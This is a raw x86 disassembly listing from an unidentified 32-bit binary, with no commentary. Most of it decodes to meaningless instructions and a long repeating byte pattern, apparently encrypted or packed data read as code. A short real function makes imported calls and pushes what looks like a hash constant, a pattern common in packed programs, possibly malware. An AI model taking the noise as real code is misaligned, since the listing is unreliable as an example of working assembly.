  422b60:	and    ebp,DWORD PTR [edi]
  422b62:	cmp    DWORD PTR [edx],eax
  422b64:	test   eax,0x3662bd59
  422b69:	pop    esp
  422b6a:	outs   dx,DWORD PTR ds:[esi]
  422b6b:	not    DWORD PTR [ebp+0x3]
  422b6e:	jmp    0x450cdbad
  422b73:	xchg   DWORD PTR [ecx-0x2806718f],edx
  422b79:	repnz cwde 
  422b7b:	dec    edx
  422b7c:	inc    BYTE PTR [edi+0x18]
  422b7f:	mov    dl,0x60
  422b81:	gs jo  0x422b99
  422b84:	test   eax,0x2cfb18d
  422b89:	xchg   bh,ch
  422b8b:	repz fadd DWORD PTR [ecx-0x6f]
  422b8f:	xor    eax,0xb0442c13
  422b94:	dec    edi
  422b95:	mov    esp,0xb799e65d
  422b9a:	xor    cl,bh
  422b9c:	hlt    
  422b9d:	dec    ebx
  422b9e:	aaa    
  422b9f:	jmp    0xcc89753f
  422ba4:	adc    BYTE PTR [ebx-0x30],bh
  422ba7:	lock dec esp
  422ba9:	js     0x13c70384
  422baf:	inc    esp
  422bb0:	icebp  
  422bb1:	mov    bl,0xb9
  422bb3:	dec    edx
  422bb4:	xchg   esp,eax
  422bb5:	jl     0x422b80
  422bb7:	ss popa 
  422bb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422bba:	pop    ebp
  422bbb:	sub    eax,0xa84ee6af
  422bc0:	or     BYTE PTR [edx],bh
  422bc2:	jb     0x422bba
  422bc4:	pop    ecx
  422bc5:	or     dl,BYTE PTR [esi-0x3f]
  422bc8:	(bad)  
  422bc9:	adc    al,0xa6
  422bcb:	dec    ebp
  422bcc:	bnd jle 0x422ba1
  422bcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422bd0:	dec    ebp
  422bd1:	pop    ebx
  422bd2:	adc    al,0xa2
  422bd4:	pop    esp
  422bd5:	mov    edi,0x7fe6be4c
  422bda:	sti    
  422bdb:	scas   al,BYTE PTR es:[edi]
  422bdc:	adc    al,0xec
  422bde:	cwde   
  422bdf:	idiv   BYTE PTR [esi-0x19]
  422be2:	pusha  
  422be3:	jp     0x422c07
  422be5:	mov    ch,0x65
  422be7:	mov    ebp,0xca7767f2
  422bec:	scas   eax,DWORD PTR es:[edi]
  422bed:	sar    esi,1
  422bef:	and    bl,BYTE PTR [ebp+0x5e0bb718]
  422bf5:	cmp    esp,ebx
  422bf7:	dec    eax
  422bf8:	and    ch,BYTE PTR [ebx-0x2bfb0e69]
  422bfe:	shr    BYTE PTR [ebx-0x38],0xa5
  422c02:	adc    eax,0xebff4a2a
  422c07:	outs   dx,DWORD PTR ds:[esi]
  422c08:	popf   
  422c09:	mov    ds:0x3ba8e92c,al
  422c0e:	xor    bh,0xde
  422c11:	inc    ebp
  422c12:	enter  0x4d04,0x6
  422c16:	jg     0x422c6e
  422c18:	mov    ds:0x41eaf9c7,eax
  422c1d:	sbb    ebx,eax
  422c1f:	add    eax,DWORD PTR [edi+ebp*1]
  422c22:	arpl   di,di
  422c24:	cwde   
  422c25:	hlt    
  422c26:	pusha  
  422c27:	xchg   ecx,eax
  422c28:	push   esp
  422c29:	and    eax,0x33db56d1
  422c2e:	data16 loop 0x422c6f
  422c31:	jmp    0x422c29
  422c33:	pop    ecx
  422c34:	std    
  422c35:	lea    ebp,[edi+0x1b0852c3]
  422c3b:	sbb    eax,0xf732bb7
  422c40:	adc    dh,BYTE PTR [ecx+0xdb32bb2]
  422c46:	mov    ah,0x14
  422c48:	inc    ebx
  422c49:	call   0x3eb0c593
  422c4e:	fadd   DWORD PTR [ebp-0x63]
  422c51:	and    al,0xb3
  422c53:	mov    dl,BYTE PTR [edx-0x19]
  422c56:	mov    BYTE PTR [esi+0x2e],cl
  422c59:	add    bh,BYTE PTR [ecx-0x2ba9ed4f]
  422c5f:	cmp    DWORD PTR [edi],edx
  422c61:	pop    esi
  422c62:	push   cs
  422c63:	and    BYTE PTR [ebx],al
  422c65:	jnp    0x422cb9
  422c67:	jns    0x422bf6
  422c69:	leave  
  422c6a:	in     eax,0xc8
  422c6c:	sbb    al,0xc5
  422c6e:	addr16 cli 
  422c70:	cwde   
  422c71:	mov    ebp,0xbdbdb2fe
  422c76:	(bad)  
  422c77:	imul   eax,DWORD PTR [ecx+ebx*2-0x53092f0f],0x57a3a101
  422c82:	pop    ecx
  422c83:	and    al,0xb7
  422c85:	aaa    
  422c86:	cmp    edi,DWORD PTR [esi-0x1]
  422c89:	xor    ah,dh
  422c8b:	sub    DWORD PTR [edx+0x4f876f51],eax
  422c91:	pop    edi
  422c92:	mov    bh,BYTE PTR ds:0xb155ee3c
  422c98:	add    dl,dl
  422c9a:	jle    0x422cb7
  422c9c:	xor    eax,DWORD PTR [esi]
  422c9e:	lods   eax,DWORD PTR ds:[esi]
  422c9f:	std    
  422ca0:	in     al,dx
  422ca1:	mov    ah,0xed
  422ca3:	jl     0x422cc2
  422ca5:	sbb    al,cl
  422ca7:	cmp    al,0x9c
  422ca9:	pushf  
  422caa:	(bad)  
  422cab:	dec    edi
  422cac:	push   0x7f143d89
  422cb1:	ins    DWORD PTR es:[edi],dx
  422cb2:	push   0xffffffc8
  422cb4:	push   0x6c
  422cb6:	in     al,dx
  422cb7:	dec    BYTE PTR [edx]
  422cb9:	and    al,0xca
  422cbb:	push   ebx
  422cbc:	inc    ecx
  422cbd:	das    
  422cbe:	dec    ecx
  422cbf:	sub    eax,0x3635655b
  422cc4:	inc    esp
  422cc5:	icebp  
  422cc6:	add    DWORD PTR [edx-0x6],esi
  422cc9:	out    dx,al
  422cca:	lods   eax,DWORD PTR ds:[esi]
  422ccb:	mov    ch,0x65
  422ccd:	jb     0x422d48
  422ccf:	mov    ch,0x50
  422cd1:	push   es
  422cd2:	add    DWORD PTR [ebx],ecx
  422cd4:	ret    0x658a
  422cd7:	(bad)  
  422cd8:	lods   eax,DWORD PTR ds:[esi]
  422cd9:	lods   eax,DWORD PTR ds:[esi]
  422cda:	jecxz  0x422d1d
  422cdc:	inc    edx
  422cdd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422cde:	shr    DWORD PTR [ecx-0x69],0xb
  422ce2:	mov    ds:0xb3adaece,al
  422ce7:	neg    DWORD PTR [ecx+eiz*8]
  422cea:	xchg   BYTE PTR [ecx],bh
  422cec:	pop    ds
  422ced:	fdiv   st,st(6)
  422cef:	push   ss
  422cf0:	(bad)  
  422cf1:	fcmove st,st(5)
  422cf3:	scas   al,BYTE PTR es:[edi]
  422cf4:	mov    esi,0x15bab941
  422cf9:	jo     0x422d58
  422cfb:	cmp    al,0xdd
  422cfd:	sub    DWORD PTR [edi],edi
  422cff:	sbb    eax,0xb399a470
  422d04:	jae    0x422d44
  422d06:	push   ebp
  422d07:	dec    ecx
  422d08:	pop    edi
  422d09:	jg     0x422d67
  422d0b:	add    ebx,eax
  422d0d:	outs   dx,BYTE PTR ds:[esi]
  422d0e:	push   esi
  422d0f:	jp     0x422ce5
  422d11:	mov    al,ds:0x70fa248b
  422d16:	imul   edx,DWORD PTR ds:0xb9826d45,0xcfc63082
  422d20:	neg    DWORD PTR [eax-0x5f]
  422d23:	in     eax,0x4d
  422d25:	sbb    al,0xcf
  422d27:	dec    edx
  422d28:	add    al,0x8f
  422d2a:	test   al,0x57
  422d2c:	cld    
  422d2d:	sub    bh,BYTE PTR [eax+esi*4]
  422d30:	nop
  422d31:	mov    edi,0x91447f92
  422d36:	test   BYTE PTR [eax-0x3106ab7],cl
  422d3c:	cld    
  422d3d:	into   
  422d3e:	cli    
  422d3f:	mov    ds:0x2454c93b,al
  422d44:	lods   eax,DWORD PTR ds:[esi]
  422d45:	xor    DWORD PTR [ebp+ebx*2-0x3d],esp
  422d49:	dec    eax
  422d4a:	or     ch,BYTE PTR [ebx+ebx*4]
  422d4d:	xor    eax,0xda9ae7b0
  422d52:	and    ecx,DWORD PTR [edx+ecx*2-0x3e]
  422d56:	jo     0x422d19
  422d58:	mov    ds:0x8a2dc38,eax
  422d5d:	mov    bh,0x45
  422d5f:	test   BYTE PTR [ecx+ebp*8-0x5c],0x93
  422d64:	adc    DWORD PTR [ebx+ebp*4],esp
  422d67:	pop    edx
  422d68:	hlt    
  422d69:	mov    BYTE PTR [ebx+0x7e5252f4],bh
  422d6f:	sbb    DWORD PTR [ebx+0x38568ec4],esp
  422d75:	ss cmp eax,0xae540030
  422d7b:	jge    0x422dde
  422d7d:	push   edi
  422d7e:	xchg   esp,eax
  422d7f:	ja     0x422d17
  422d81:	je     0x422dd9
  422d83:	ror    DWORD PTR [edx],0x11
  422d86:	pop    ebx
  422d87:	out    dx,eax
  422d88:	push   0xffffffa4
  422d8a:	sub    dl,0x5d
  422d8d:	mov    edx,0x47934db1
  422d92:	and    edi,DWORD PTR [ebx-0x10]
  422d95:	data16 fsubrp st(3),st
  422d98:	sub    ch,BYTE PTR [ebx]
  422d9a:	pop    edx
  422d9b:	fst    QWORD PTR [ebx-0x58]
  422d9e:	out    0xcc,al
  422da0:	dec    esi
  422da1:	push   edx
  422da2:	jmp    0x422df5
  422da4:	and    BYTE PTR [ecx-0x3f2dd7b0],dl
  422daa:	pop    edx
  422dab:	pop    eax
  422dac:	jp     0x422d5f
  422dae:	cld    
  422daf:	test   BYTE PTR [eax+0x60a4c453],dl
  422db5:	mov    bh,BYTE PTR [ebx-0x17]
  422db8:	dec    edi
  422db9:	mov    bl,0x32
  422dbb:	mov    al,0x43
  422dbd:	sub    dh,BYTE PTR [esp+edx*4]
  422dc0:	enter  0x2496,0x3d
  422dc4:	jmp    0x4341e0c4
  422dc9:	sub    ebx,esi
  422dcb:	in     al,dx
  422dcc:	pushf  
  422dcd:	dec    ebp
  422dce:	imul   esi,ebx,0xffffff89
  422dd1:	pusha  
  422dd2:	test   BYTE PTR [eax-0x23507f41],bh
  422dd8:	cdq    
  422dd9:	pop    ebp
  422dda:	pop    ecx
  422ddb:	dec    ecx
  422ddc:	jae    0x422dae
  422dde:	je     0x422d6a
  422de0:	adc    DWORD PTR [edi-0x5a91886d],eax
  422de6:	cmp    DWORD PTR [edi+ebx*4-0x3790a50a],ecx
  422ded:	push   ss
  422dee:	mov    eax,0x1
  422df3:	mov    esp,ebp
  422df5:	pop    ebp
  422df6:	ret    
  422df7:	int3   
  422df8:	int3   
  422df9:	int3   
  422dfa:	int3   
  422dfb:	int3   
  422dfc:	int3   
  422dfd:	int3   
  422dfe:	int3   
  422dff:	int3   
  422e00:	push   ebp
  422e01:	mov    ebp,esp
  422e03:	sub    esp,0x8
  422e06:	push   esi
  422e07:	push   0xffff
  422e0c:	push   0x0
  422e0e:	mov    DWORD PTR [ebp-0x4],0x0
  422e15:	call   DWORD PTR ds:0x42902c
  422e1b:	mov    esi,DWORD PTR ds:0x429034
  422e21:	push   0xa
  422e23:	push   0x0
  422e25:	push   0x0
  422e27:	push   0xffffffff
  422e29:	mov    DWORD PTR [ebp-0x8],esi
  422e2c:	call   0x424340
  422e31:	test   esi,esi
  422e33:	jne    0x422e3f
  422e35:	push   esi
  422e36:	push   0x1
  422e38:	push   esi
  422e39:	call   DWORD PTR ds:0x429028
  422e3f:	push   0x0
  422e41:	push   0x4e
  422e43:	push   0x1e
  422e45:	push   0x0
  422e47:	call   DWORD PTR ds:0x429024
  422e4d:	test   eax,eax
  422e4f:	je     0x422e59
  422e51:	push   0x0
  422e53:	call   DWORD PTR ds:0x429008
  422e59:	mov    esi,DWORD PTR [ebp-0x8]
  422e5c:	call   esi
  422e5e:	mov    DWORD PTR [ebp-0x4],eax
  422e61:	mov    esi,DWORD PTR [ebp-0x4]
  422e64:	cmp    esi,0x57
  422e67:	jne    0x422e7e
  422e69:	push   0xf045acb1
  422e6e:	call   0x411080
  422e73:	add    esp,0x4
  422e76:	push   0x0
  422e78:	call   DWORD PTR ds:0x429020
  422e7e:	push   0x5
  422e80:	push   esi
  422e81:	call   DWORD PTR ds:0x42913c
  422e87:	xor    eax,eax
  422e89:	pop    esi
  422e8a:	mov    esp,ebp
  422e8c:	pop    ebp
  422e8d:	ret    
  422e8e:	nop
  422e8f:	nop
  422e90:	sub    esp,0x10
  422e93:	push   0x0
  422e95:	push   0x0
  422e97:	push   0x0
  422e99:	call   DWORD PTR ds:0x429038
  422e9f:	push   0x0
  422ea1:	push   0x0
  422ea3:	call   DWORD PTR ds:0x429148
  422ea9:	lea    eax,[esp+0x0]
  422ead:	push   eax
  422eae:	call   DWORD PTR ds:0x429054
  422eb4:	call   DWORD PTR ds:0x429034
  422eba:	push   0x0
  422ebc:	push   0x0
  422ebe:	push   0x0
  422ec0:	call   0x424346
  422ec5:	cmp    WORD PTR [esp+0x0],0x0
  422ecb:	push   0x0
  422ecd:	je     0x422ee6
  422ecf:	push   0x0
  422ed1:	call   DWORD PTR ds:0x429130
  422ed7:	push   0x0
  422ed9:	call   0x422e00
  422ede:	add    esp,0x4
  422ee1:	jmp    0x42431e
  422ee6:	push   0x14
  422ee8:	push   0x0
  422eea:	push   0x0
  422eec:	call   DWORD PTR ds:0x429010
  422ef2:	call   ecx
  422ef4:	push   edx
  422ef5:	outs   dx,BYTE PTR ds:[esi]
  422ef6:	push   edi
  422ef7:	push   esp
  422ef8:	aam    0x69
  422efa:	imul   si,WORD PTR [edi+0x630df801],0xfe08
  422f03:	out    dx,eax
  422f04:	push   edi
  422f05:	aam    0x69
  422f07:	ins    WORD PTR es:[edi],dx
  422f09:	mov    bh,0x1
  422f0b:	mov    eax,0xfe089cf2
  422f10:	push   edi
  422f11:	push   edi
  422f12:	aam    0x69
  422f14:	ins    WORD PTR es:[edi],dx
  422f16:	mov    bh,0x1
  422f18:	clc    
  422f19:	repnz pushf 
  422f1b:	or     dh,bh
  422f1d:	push   edi
  422f1e:	push   edi
  422f1f:	aam    0x69
  422f21:	ins    WORD PTR es:[edi],dx
  422f23:	mov    bh,0x1
  422f25:	clc    
  422f26:	repnz pushf 
  422f28:	or     dh,bh
  422f2a:	push   edi
  422f2b:	push   edi
  422f2c:	aam    0x69
  422f2e:	xchg   bp,ax
  422f30:	mov    bh,0x1
  422f32:	clc    
  422f33:	cld    
  422f34:	xor    DWORD PTR [edx-0x221ca810],0xffffffa4
  422f3b:	inc    edi
  422f3c:	aad    0xb6
  422f3e:	dec    ebp
  422f3f:	xor    eax,0x9760c8d3
  422f44:	and    al,0x77
  422f46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f47:	sbb    ecx,DWORD PTR [ecx]
  422f49:	or     al,ch
  422f4b:	pusha  
  422f4c:	xchg   ebp,eax
  422f4d:	sar    bh,cl
  422f4f:	imul   edx,DWORD PTR [eax+0x49a03839],0x73970804
  422f59:	lea    ebx,[esp+edi*4+0x13779061]
  422f60:	fwait
  422f61:	cmp    al,BYTE PTR [esi+0x0]
  422f64:	fsub   DWORD PTR [ebp-0x63]
  422f67:	fcom   QWORD PTR [ecx+0x5773f405]
  422f6d:	aam    0x69
  422f6f:	ins    WORD PTR es:[edi],dx
  422f71:	mov    bh,0x1
  422f73:	jmp    FWORD PTR [ebx+0x60]
  422f76:	push   ecx
  422f77:	mov    ebp,0x2adec5af
  422f7c:	sahf   
  422f7d:	(bad)  
  422f7e:	mov    ebp,0x96600042
  422f83:	push   eax
  422f84:	fwait
  422f85:	pop    ebx
  422f86:	pop    ebp
  422f87:	mov    edx,DWORD PTR [ecx+0x64ef67f4]
  422f8d:	sar    al,0x5e
  422f90:	lock ins BYTE PTR es:[edi],dx
  422f92:	pop    ebp
  422f93:	cmpxchg DWORD PTR [eax+0x6c],edx
  422f97:	add    eax,0xdef2934f
  422f9c:	adc    dh,BYTE PTR [ecx]
  422f9e:	hlt    
  422f9f:	adc    DWORD PTR [edi-0x12d39cba],ebp
  422fa5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422fa6:	or     esi,DWORD PTR [edx-0x4bfdf1f6]
  422fac:	xlat   BYTE PTR ds:[ebx]
  422fad:	push   esi
  422fae:	fidiv  WORD PTR [ecx]
  422fb0:	sahf   
  422fb1:	(bad)  
  422fb2:	mov    ebp,0x96610042
  422fb7:	and    BYTE PTR [edi],al
  422fb9:	lds    ebx,FWORD PTR [ebp+0x6b]
  422fbc:	mov    cl,0xe6
  422fbe:	addr16 cli 
  422fc0:	stc    
  422fc1:	push   0xfffffff8
  422fc3:	les    ebp,FWORD PTR [ebp-0x3d]
  422fc6:	pop    ebp
  422fc7:	pop    edi
  422fc8:	sub    al,0xfb
  422fca:	ins    BYTE PTR es:[edi],dx
  422fcb:	xor    eax,0xb0f209d2
  422fd0:	fs call 0x2463:0xdb320ff4
  422fd8:	xchg   ebp,eax
  422fd9:	and    eax,0xff9baa0b
  422fde:	pusha  
  422fdf:	mov    ebp,0x69dec5af
  422fe4:	ins    WORD PTR es:[edi],dx
  422fe6:	mov    bh,0x1
  422fe8:	clc    
  422fe9:	repnz pushf 
  422feb:	pop    eax
  422fec:	mov    ebx,0x68985757
  422ff1:	fs ins DWORD PTR es:[edi],dx
  422ff3:	pop    ebx
  422ff4:	loop   0x422f9d
  422ff6:	mov    ebp,0x57fe089c
  422ffb:	push   edi
  422ffc:	aam    0x69
  422ffe:	lea    si,[edi-0x620606fe]
  423005:	add    bh,dh
  423007:	push   edi
  423008:	mov    ebx,0x696669d0
  42300d:	mov    cl,0x1
  42300f:	clc    
  423010:	repnz pushf 
  423012:	or     bh,bh
  423014:	jmp    0xb76d:0x7669d457
  42301b:	add    eax,edi
  42301d:	neg    DWORD PTR [eax+ecx*1-0x2ba8e902]
  423024:	jns    0x42308c
  423026:	ins    DWORD PTR es:[edi],dx
  423027:	mov    bh,0x3
  423029:	clc    
  42302a:	repnz cdq 
  42302c:	or     bh,bh
  42302e:	push   edi
  42302f:	push   edi
  423030:	aam    0x69
  423032:	pushw  0xb7
  423036:	clc    
  423037:	repnz pushf 
  423039:	or     dh,bh
  42303b:	push   edi
  42303c:	xlat   BYTE PTR ds:[ebx]
  42303d:	fild   QWORD PTR [ecx+0x66]
  423040:	imul   esi,DWORD PTR [edi-0x663cbaff],0x5757fc08
  42304a:	push   esp
  42304b:	imul   esp,DWORD PTR [esi+0x7d],0xf2e801b7
  423052:	pushf  
  423053:	or     dh,bh
  423055:	inc    edi
  423056:	push   edi
  423057:	aam    0x79
  423059:	ins    WORD PTR es:[edi],dx
  42305b:	mov    bh,0x1
  42305d:	clc    
  42305e:	repnz mov WORD PTR [eax],cs
  423061:	(bad)  
  423062:	push   edi
  423063:	push   edi
  423064:	aam    0x69
  423066:	ins    WORD PTR es:[edi],dx
  423068:	mov    bh,0x1
  42306a:	clc    
  42306b:	jbe    0x42305f
  42306d:	add    edi,esi
  42306f:	ds push esp
  423071:	aam    0x69
  423073:	pop    bp
  423075:	mov    esp,0x9ccf3701
  42307a:	or     dh,bh
  42307c:	push   edi
  42307d:	push   edi
  42307e:	aam    0x69
  423080:	ins    WORD PTR es:[edi],dx
  423082:	mov    bh,0x1
  423084:	clc    
  423085:	repnz pushf 
  423087:	or     dh,bh
  423089:	push   edi
  42308a:	push   edi
  42308b:	aam    0x69
  42308d:	ins    WORD PTR es:[edi],dx
  42308f:	mov    bh,0x1
  423091:	clc    
  423092:	repnz pushf 
  423094:	or     dh,bh
  423096:	push   edi
  423097:	push   edi
  423098:	aam    0x69
  42309a:	ins    WORD PTR es:[edi],dx
  42309c:	mov    bh,0x1
  42309e:	clc    
  42309f:	repnz pushf 
  4230a1:	or     dh,bh
  4230a3:	push   edi
  4230a4:	push   edi
  4230a5:	aam    0x69
  4230a7:	ins    WORD PTR es:[edi],dx
  4230a9:	mov    bh,0x1
  4230ab:	clc    
  4230ac:	repnz pushf 
  4230ae:	or     dh,bh
  4230b0:	push   edi
  4230b1:	push   edi
  4230b2:	aam    0x69
  4230b4:	ins    WORD PTR es:[edi],dx
  4230b6:	mov    bh,0x1
  4230b8:	clc    
  4230b9:	repnz pushf 
  4230bb:	or     dh,bh
  4230bd:	push   edi
  4230be:	push   edi
  4230bf:	aam    0x69
  4230c1:	ins    WORD PTR es:[edi],dx
  4230c3:	mov    bh,0x1
  4230c5:	clc    
  4230c6:	repnz pushf 
  4230c8:	or     dh,bh
  4230ca:	push   edi
  4230cb:	push   edi
  4230cc:	aam    0x69
  4230ce:	ins    WORD PTR es:[edi],dx
  4230d0:	mov    bh,0x1
  4230d2:	clc    
  4230d3:	repnz pushf 
  4230d5:	or     dh,bh
  4230d7:	push   edi
  4230d8:	push   edi
  4230d9:	aam    0x69
  4230db:	ins    WORD PTR es:[edi],dx
  4230dd:	mov    bh,0x1
  4230df:	clc    
  4230e0:	repnz pushf 
  4230e2:	or     al,dl
  4230e4:	and    esi,DWORD PTR [edx]
  4230e6:	lods   al,BYTE PTR ds:[esi]
  4230e7:	sbb    eax,0x1b76d66
  4230ec:	fdivr  st,st(1)
  4230ee:	pushf  
  4230ef:	or     dh,ch
  4230f1:	push   edi
  4230f2:	push   edi
  4230f3:	aam    0x53
  4230f5:	bound  ebp,QWORD PTR [ebp-0x49]
  4230f8:	add    eax,0x4dccf2f8
  4230fd:	mov    ebp,0x699b0365
  423102:	ins    WORD PTR es:[edi],dx
  423104:	mov    bh,0x1
  423106:	clc    
  423107:	rcr    BYTE PTR [eax+ecx*1-0x58da86e2],cl
  42310e:	sbb    eax,DWORD PTR ds:0xf801b76d
  423114:	mov    ds:0x67fe089c,al
  423119:	pop    esp
  42311a:	aam    0x69
  42311c:	ss ins DWORD PTR es:[edi],dx
  42311e:	mov    bh,0x1
  423120:	(bad)  
  423121:	neg    BYTE PTR [eax+ecx*1-0x2ba8a802]
  423128:	imul   esp,DWORD PTR [esi+0x6d],0xf2f801b7
  42312f:	mov    esp,0x57b7fe08
  423134:	aam    0x69
  423136:	ins    WORD PTR es:[edi],dx
  423138:	mov    bh,0x1
  42313a:	clc    
  42313b:	repnz pushf 
  42313d:	or     dh,bh
  42313f:	push   edi
  423140:	push   edi
  423141:	aam    0x69
  423143:	ins    WORD PTR es:[edi],dx
  423145:	mov    bh,0x1
  423147:	clc    
  423148:	repnz pushf 
  42314a:	or     dh,bh
  42314c:	push   edi
  42314d:	push   edi
  42314e:	aam    0x69
  423150:	ins    WORD PTR es:[edi],dx
  423152:	mov    bh,0x1
  423154:	clc    
  423155:	repnz pushf 
  423157:	or     dh,bh
  423159:	push   edi
  42315a:	push   edi
  42315b:	aam    0x69
  42315d:	ins    WORD PTR es:[edi],dx
  42315f:	mov    bh,0x1
  423161:	clc    
  423162:	repnz pushf 
  423164:	or     dh,bh
  423166:	push   edi
  423167:	push   edi
  423168:	aam    0x69
  42316a:	ins    WORD PTR es:[edi],dx
  42316c:	mov    bh,0x1
  42316e:	clc    
  42316f:	repnz pushf 
  423171:	or     dh,bh
  423173:	push   edi
  423174:	push   edi
  423175:	aam    0x69
  423177:	ins    WORD PTR es:[edi],dx
  423179:	mov    bh,0x1
  42317b:	clc    
  42317c:	repnz pushf 
  42317e:	or     dh,bh
  423180:	push   edi
  423181:	push   edi
  423182:	aam    0x69
  423184:	ins    WORD PTR es:[edi],dx
  423186:	mov    bh,0x1
  423188:	clc    
  423189:	repnz pushf 
  42318b:	or     dh,bh
  42318d:	push   edi
  42318e:	push   edi
  42318f:	aam    0x69
  423191:	ins    WORD PTR es:[edi],dx
  423193:	mov    bh,0x1
  423195:	clc    
  423196:	repnz pushf 
  423198:	or     dh,bh
  42319a:	push   edi
  42319b:	push   edi
  42319c:	aam    0x69
  42319e:	ins    WORD PTR es:[edi],dx
  4231a0:	mov    bh,0x1
  4231a2:	clc    
  4231a3:	repnz pushf 
  4231a5:	or     dh,bh
  4231a7:	push   edi
  4231a8:	push   edi
  4231a9:	aam    0x69
  4231ab:	ins    WORD PTR es:[edi],dx
  4231ad:	mov    bh,0x1
  4231af:	clc    
  4231b0:	repnz pushf 
  4231b2:	or     dh,bh
  4231b4:	push   edi
  4231b5:	push   edi
  4231b6:	aam    0x69
  4231b8:	ins    WORD PTR es:[edi],dx
  4231ba:	mov    bh,0x1
  4231bc:	clc    
  4231bd:	repnz pushf 
  4231bf:	or     dh,bh
  4231c1:	push   edi
  4231c2:	push   edi
  4231c3:	aam    0x69
  4231c5:	ins    WORD PTR es:[edi],dx
  4231c7:	mov    bh,0x1
  4231c9:	clc    
  4231ca:	repnz pushf 
  4231cc:	or     dh,bh
  4231ce:	push   edi
  4231cf:	push   edi
  4231d0:	aam    0x69
  4231d2:	ins    WORD PTR es:[edi],dx
  4231d4:	mov    bh,0x1
  4231d6:	clc    
  4231d7:	repnz pushf 
  4231d9:	or     dh,bh
  4231db:	push   edi
  4231dc:	push   edi
  4231dd:	aam    0x69
  4231df:	ins    WORD PTR es:[edi],dx
  4231e1:	mov    bh,0x1
  4231e3:	clc    
  4231e4:	repnz pushf 
  4231e6:	or     dh,bh
  4231e8:	push   edi
  4231e9:	push   edi
  4231ea:	aam    0x69
  4231ec:	ins    WORD PTR es:[edi],dx
  4231ee:	mov    bh,0x1
  4231f0:	clc    
  4231f1:	repnz pushf 
  4231f3:	or     dh,bh
  4231f5:	push   edi
  4231f6:	push   edi
  4231f7:	aam    0x69
  4231f9:	ins    WORD PTR es:[edi],dx
  4231fb:	mov    bh,0x1
  4231fd:	clc    
  4231fe:	repnz pushf 
  423200:	or     dh,bh
  423202:	push   edi
  423203:	push   edi
  423204:	aam    0x69
  423206:	ins    WORD PTR es:[edi],dx
  423208:	mov    bh,0x1
  42320a:	clc    
  42320b:	repnz pushf 
  42320d:	or     dh,bh
  42320f:	push   edi
  423210:	push   edi
  423211:	aam    0x69
  423213:	ins    WORD PTR es:[edi],dx
  423215:	mov    bh,0x1
  423217:	clc    
  423218:	repnz pushf 
  42321a:	or     dh,bh
  42321c:	push   edi
  42321d:	push   edi
  42321e:	aam    0x69
  423220:	ins    WORD PTR es:[edi],dx
  423222:	mov    bh,0x1
  423224:	clc    
  423225:	repnz pushf 
  423227:	or     dh,bh
  423229:	push   edi
  42322a:	push   edi
  42322b:	aam    0x69
  42322d:	ins    WORD PTR es:[edi],dx
  42322f:	mov    bh,0x1
  423231:	clc    
  423232:	repnz pushf 
  423234:	or     dh,bh
  423236:	push   edi
  423237:	push   edi
  423238:	aam    0x69
  42323a:	ins    WORD PTR es:[edi],dx
  42323c:	mov    bh,0x1
  42323e:	clc    
  42323f:	repnz pushf 
  423241:	or     dh,bh
  423243:	push   edi
  423244:	push   edi
  423245:	aam    0x69
  423247:	ins    WORD PTR es:[edi],dx
  423249:	mov    bh,0x1
  42324b:	clc    
  42324c:	repnz pushf 
  42324e:	or     dh,bh
  423250:	push   edi
  423251:	push   edi
  423252:	aam    0x69
  423254:	ins    WORD PTR es:[edi],dx
  423256:	mov    bh,0x1
  423258:	clc    
  423259:	repnz pushf 
  42325b:	or     dh,bh
  42325d:	push   edi
  42325e:	push   edi
  42325f:	aam    0x69
  423261:	ins    WORD PTR es:[edi],dx
  423263:	mov    bh,0x1
  423265:	clc    
  423266:	repnz pushf 
  423268:	or     dh,bh
  42326a:	push   edi
  42326b:	push   edi
  42326c:	aam    0x69
  42326e:	ins    WORD PTR es:[edi],dx
  423270:	mov    bh,0x1
  423272:	clc    
  423273:	repnz pushf 
  423275:	or     dh,bh
  423277:	push   edi
  423278:	push   edi
  423279:	aam    0x69
  42327b:	ins    WORD PTR es:[edi],dx
  42327d:	mov    bh,0x1
  42327f:	clc    
  423280:	repnz pushf 
  423282:	or     dh,bh
  423284:	push   edi
  423285:	push   edi
  423286:	aam    0x69
  423288:	ins    WORD PTR es:[edi],dx
  42328a:	mov    bh,0x1
  42328c:	clc    
  42328d:	repnz pushf 
  42328f:	or     dh,bh
  423291:	push   edi
  423292:	push   edi
  423293:	aam    0x69
  423295:	ins    WORD PTR es:[edi],dx
  423297:	mov    bh,0x1
  423299:	clc    
  42329a:	repnz pushf 
  42329c:	or     dh,bh
  42329e:	push   edi
  42329f:	push   edi
  4232a0:	aam    0x69
  4232a2:	ins    WORD PTR es:[edi],dx
  4232a4:	mov    bh,0x1
  4232a6:	clc    
  4232a7:	repnz pushf 
  4232a9:	or     dh,bh
  4232ab:	push   edi
  4232ac:	push   edi
  4232ad:	aam    0x69
  4232af:	ins    WORD PTR es:[edi],dx
  4232b1:	mov    bh,0x1
  4232b3:	clc    
  4232b4:	repnz pushf 
  4232b6:	or     dh,bh
  4232b8:	push   edi
  4232b9:	push   edi
  4232ba:	aam    0x69
  4232bc:	ins    WORD PTR es:[edi],dx
  4232be:	mov    bh,0x1
  4232c0:	clc    
  4232c1:	repnz pushf 
  4232c3:	or     dh,bh
  4232c5:	push   edi
  4232c6:	push   edi
  4232c7:	aam    0x69
  4232c9:	ins    WORD PTR es:[edi],dx
  4232cb:	mov    bh,0x1
  4232cd:	clc    
  4232ce:	repnz pushf 
  4232d0:	or     dh,bh
  4232d2:	push   edi
  4232d3:	push   edi
  4232d4:	aam    0x69
  4232d6:	ins    WORD PTR es:[edi],dx
  4232d8:	mov    bh,0x1
  4232da:	clc    
  4232db:	repnz pushf 
  4232dd:	or     dh,bh
  4232df:	push   edi
  4232e0:	push   edi
  4232e1:	aam    0x69
  4232e3:	ins    WORD PTR es:[edi],dx
  4232e5:	mov    bh,0x1
  4232e7:	clc    
  4232e8:	repnz pushf 
  4232ea:	or     dh,bh
  4232ec:	push   edi
  4232ed:	push   edi
  4232ee:	aam    0x69
  4232f0:	ins    WORD PTR es:[edi],dx
  4232f2:	mov    bh,0x46
  4232f4:	push   ss
  4232f5:	clc    
  4232f6:	pushf  
  4232f7:	daa    
  4232f8:	(bad)  
  4232f9:	push   edi
  4232fa:	inc    edi
  4232fb:	aam    0x69
  4232fd:	dec    esp
  4232fe:	iret   
  4232ff:	ins    DWORD PTR es:[edi],dx
